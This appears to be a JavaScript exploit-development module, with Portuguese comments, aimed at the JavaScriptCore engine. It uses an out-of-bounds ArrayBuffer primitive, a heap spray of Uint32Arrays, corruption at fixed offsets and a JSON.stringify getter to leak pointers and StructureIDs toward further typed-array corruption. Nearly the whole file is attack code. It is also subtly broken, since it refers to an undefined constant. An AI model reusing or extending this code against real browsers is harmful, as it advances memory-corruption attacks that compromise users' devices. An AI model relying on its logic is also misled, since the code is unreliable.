// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.13";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_13";
const PLANT_OFFSET_0x6C = 0x6C; // Onde o sistema pode vazar um ponteiro baixo
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;   // Onde o "ponteiro fonte mágico" (0xptr_low_0) aparece
const CORRUPTION_OFFSET_TRIGGER = 0x70;      // Onde escrevemos 0xFFFFFFFF_FFFFFFFF
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido (JSCell) será copiado

let getter_copy_called_flag_v10_13 = false;

let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 41;


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_13)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_13(dword_source_offset_to_read_from) {
    // Esta função agora é um invólucro mais fino, pois o valor em 0x6C é preparado externamente.
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_13`;
    getter_copy_called_flag_v10_13 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    // Não plantamos em 0x6C aqui; esperamos que a corrupção o tenha preenchido.

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_13 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high(); // Este é o valor que esperamos que a corrupção tenha colocado em 0x6C.low

                // logS3(`    [GETTER] QWORD em 0x68: ${qword_at_0x68.toString(true)}. Effective read offset: ${toHex(effective_read_offset)}`, "info", FNAME_PRIMITIVE);

                if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                    const data_read = oob_read_absolute(effective_read_offset, 8);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                } else {
                    logS3(`    [GETTER] Offset de leitura efetivo ${toHex(effective_read_offset)} fora dos limites. Escrevendo Zero.`, "warn", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                }
            } catch (e_getter) {
                logS3(`    [GETTER] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_13_done";
        }
    };

    // A corrupção em 0x70 é o que pode fazer 0x6C.low ser preenchido com um ponteiro.
    // E então 0x68.high se torna esse valor.
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(10);

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_copy_called_flag_v10_13) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA
// ============================================================
async function getStructureIDFromCopiedQWORD() {
    const copied_qword = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}


// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.13)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.investigateCorruptionLeak_v10.13`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Investigando Vazamento de Ponteiro para 0x6C/0x68 via Corrupção ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // 1. Limpar offsets de interesse e pulverizar objetos
        logS3("PASSO 1: Limpando offsets de interesse e pulverizando Uint32Arrays...", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(PLANT_OFFSET_0x6C, AdvancedInt64.Zero, 8); // Limpa 0x6C
        oob_write_absolute(INTERMEDIATE_PTR_OFFSET_0x68, AdvancedInt64.Zero, 8); // Limpa 0x68
        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino da cópia

        const NUM_U32_SPRAY = 200;
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(8 + (i % 3)));
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        // 2. Acionar a primitiva de cópia (que inclui a corrupção em 0x70).
        //    Não passamos um offset fonte; esperamos que a corrupção preencha 0x6C.low
        //    que então se tornará 0x68.high, que será usado como offset fonte pelo getter.
        logS3("PASSO 2: Acionando primitiva de cópia (esperando que a corrupção vaze um offset fonte para 0x68.high)...", "info", FNAME_CURRENT_TEST);
        
        // A chamada a readFromOOBOffsetViaCopy_v10_13 agora não usa seu argumento dword_source_offset_to_read_from
        // para plantar em 0x6C, porque estamos testando se a corrupção *escreve* em 0x6C.
        // No entanto, a lógica do getter *ainda* usa o que foi plantado em 0x6C para derivar o effective_read_offset.
        // Para este teste, vamos plantar um offset baixo e válido em 0x6C para que o getter não falhe se a corrupção não vazar nada.
        const test_read_src_offset = 0x200; // Um offset válido para ler, caso a corrupção não altere 0x6C.low
        oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, new AdvancedInt64(test_read_src_offset, 0), 8);
        logS3(`  Valor de teste ${toHex(test_read_src_offset)} plantado em ${toHex(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD)} para o getter.`, "info", FNAME_CURRENT_TEST);
        
        await readFromOOBOffsetViaCopy_v10_13(test_read_src_offset); // O argumento é usado para confirmação no getter

        // 3. Analisar o que foi copiado e os valores em 0x6C e 0x68
        const val_at_0x6C_post_corruption = oob_read_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, 8);
        const val_at_0x68_post_corruption = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
        const data_copied_to_dest = oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);

        logS3("PASSO 3: Analisando resultados...", "info", FNAME_CURRENT_TEST);
        logS3(`  Valor em 0x6C (PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD) APÓS corrupção: ${val_at_0x6C_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        logS3(`  Valor em 0x68 (INTERMEDIATE_PTR_OFFSET_0x68) APÓS corrupção: ${val_at_0x68_post_corruption.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        logS3(`  Dados copiados para ${toHex(TARGET_COPY_DEST_OFFSET_IN_OOB)}: ${data_copied_to_dest.toString(true)}`, "leak", FNAME_CURRENT_TEST);

        let potential_leaked_offset = val_at_0x68_post_corruption.high();
        logS3(`  Offset efetivo de leitura usado pelo getter (de 0x68.high): ${toHex(potential_leaked_offset)}`, "info", FNAME_CURRENT_TEST);

        if (!data_copied_to_dest.isZero() && !(data_copied_to_dest.low() === 0xBADBAD && data_copied_to_dest.high() === 0xDEADDEAD) && !(data_copied_to_dest.low() === 0xBAD68BAD && data_copied_to_dest.high() === 0xBAD68BAD) ) {
            logS3("    !!!! DADOS NÃO NULOS/ERRO FORAM COPIADOS !!!!", "vuln", FNAME_CURRENT_TEST);
            logS3(`      Isso significa que o offset ${toHex(potential_leaked_offset)} continha dados.`, "vuln", FNAME_CURRENT_TEST);
            document.title = `Leak de ${toHex(potential_leaked_offset)}?`;

            const potential_sid = data_copied_to_dest.low();
            logS3(`      StructureID potencial vazado (da cópia): ${toHex(potential_sid)}`, "leak", FNAME_CURRENT_TEST);
            if (potential_sid !== 0 && potential_sid !== 0xFFFFFFFF) {
                 EXPECTED_UINT32ARRAY_STRUCTURE_ID = potential_sid; // Assume que é o que queríamos
                 logS3(`        !!!! ATRIBUÍDO ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} a EXPECTED_UINT32ARRAY_STRUCTURE_ID !!!!`, "vuln", FNAME_CURRENT_TEST);
                 logS3("        >>>> VERIFIQUE SE ESTE É UM SID VÁLIDO E ATUALIZE A CONSTANTE NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
                 document.title = `SID VAZADO? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
            }
        } else {
            logS3("    Dados copiados foram zero ou um valor de erro. O offset de leitura pode ser inválido ou apontar para zeros.", "warn", FNAME_CURRENT_TEST);
        }

        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID && EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
             logS3(`  Usando SID descoberto/confirmado: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} para próximos passos.`, "good", FNAME_CURRENT_TEST);
             // Próximo passo: usar este SID para encontrar um Uint32Array real e corromper seu m_vector/m_length
        } else {
            logS3("  StructureID do Uint32Array ainda não descoberto.", "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
